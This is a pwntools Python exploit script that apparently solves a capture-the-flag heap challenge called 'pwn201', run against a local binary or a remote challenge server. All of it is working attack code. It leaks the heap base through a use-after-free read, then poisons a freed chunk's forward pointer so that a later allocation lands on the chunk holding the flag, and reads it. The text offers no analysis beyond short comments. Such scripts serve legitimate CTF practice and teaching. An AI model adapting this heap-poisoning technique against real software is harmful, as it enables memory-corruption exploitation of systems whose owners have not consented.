from pwn import *


# initialize the binary
binary = "./pwn201"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("pwn201.youcanhack.me", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### GET HEAP base ###
p.sendline(b'2')                # allocate chunk1
p.sendline(b'2')                # allocate chunk2

p.sendline(b'1')                # free chunk1
p.sendline(b'1')

p.sendline(b'1')                # free chunk2
p.sendline(b'2')

p.sendline(b'4')                # read chunk1 (which should point to chunk2)
p.sendline(b'2')

p.recvuntil(b'Index: ')
p.recvuntil(b'Index: ')
p.recvuntil(b'Index: ')


heap_base = int.from_bytes(p.recvline()[:8], 'little') - 0x2d0
print(f"Heap base: {hex(heap_base)}")


### USE AFTER FREE (WRITE) ###
p.sendline(b'3')                # write
p.sendline(b'2')

# here, we set the fd_ptr of chunk2 to chunk0 (the flag) so we can read it
p.sendline(p64(heap_base + 0x260))  # fd_ptr

# allocate two more chunks so chunks[3] is the flag
p.sendline(b'2')                # allocate
p.sendline(b'2')                # allocate


### PROFIT ###
p.sendline(b'4')                # read
p.sendline(b'4')


p.interactive()
